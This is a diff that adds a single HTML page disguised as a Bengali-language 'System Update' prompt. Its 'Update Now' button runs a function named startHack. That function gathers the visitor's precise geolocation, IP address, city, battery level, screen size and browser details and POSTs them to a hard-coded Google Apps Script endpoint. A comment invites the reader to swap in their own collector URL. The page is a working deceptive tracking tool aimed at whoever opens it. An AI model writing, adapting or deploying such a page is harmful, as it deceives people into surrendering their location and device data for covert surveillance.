@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f4f4f4; text-align: center; padding-top: 50px; }
+        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 300px; margin: auto; }
+        h2 { color: #333; font-size: 18px; }
+        p { color: #666; font-size: 14px; }
+        .btn { background: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 15px; width: 100%; }
+        .btn:hover { background: #0056b3; }
+        #status { margin-top: 10px; font-size: 12px; color: green; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>🔔 সিস্টেম আপডেট প্রয়োজন</h2>
+    <p>আপনার ডিভাইসের নিরাপত্তা বাড়ানোর জন্য নতুন পারমিশন প্রয়োজন। দয়া করে নিচে ক্লিক করুন।</p>
+    <button class="btn" onclick="startHack()">Update Now</button>
+    <div id="status">ডেটা পাঠানো হচ্ছে...</div>
+</div>
+
+<script>
+    function startHack() {
+        document.getElementById('status').style.display = 'block';
+        
+        const deviceData = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screenRes: window.screen.width + "x" + window.screen.height,
+            battery: navigator.getBattery ? "Checking..." : "N/A",
+            time: new Date().toLocaleString(),
+            ip: "" 
+        };
+
+        if(navigator.getBattery){
+            navigator.getBattery().then(batt => {
+                deviceData.battery = batt.level * 100 + "%";
+                sendToServer(deviceData);
+            });
+        } else {
+            sendToServer(deviceData);
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                deviceData.latitude = pos.coords.latitude;
+                deviceData.longitude = pos.coords.longitude;
+                deviceData.accuracy = pos.coords.accuracy;
+                sendToServer(deviceData);
+            }, err => {
+                console.log("Location permission denied");
+                sendToServer(deviceData);
+            });
+        } else {
+            sendToServer(deviceData);
+        }
+
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                deviceData.ip = data.ip;
+                deviceData.city = data.city;
+                deviceData.country = data.country_name;
+                
+                if(deviceData.latitude) {
+                    sendToServer(deviceData); 
+                } else {
+                    deviceData.latitude = "Pending";
+                    deviceData.longitude = "Pending";
+                    sendToServer(deviceData);
+                }
+            })
+            .catch(err => console.log("IP fetch error"));
+    }
+
+    function sendToServer(data) {
+        // এখানে আপনার Google Script URL বসান
+        const scriptUrl = 'https://script.google.com/macros/s/AKfycbycWxHSynXyY53SpIcxpyA-TGmDknjalJTBb5DaTpf6ZMYeZV_HfRk7Nh5lD1nQpQbB/exec'; 
+        
+        fetch(scriptUrl, {
+            method: 'POST',
+            mode: 'no-cors', 
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        })
+        .then(() => {
+            document.getElementById('status').innerText = "✅ ডেটা জমা হয়েছে!";
+            document.getElementById('status').style.color = "green";
+        })
+        .catch(err => console.log("Send Error:", err));
+    }
+</script>
+
+</body>
+</html>
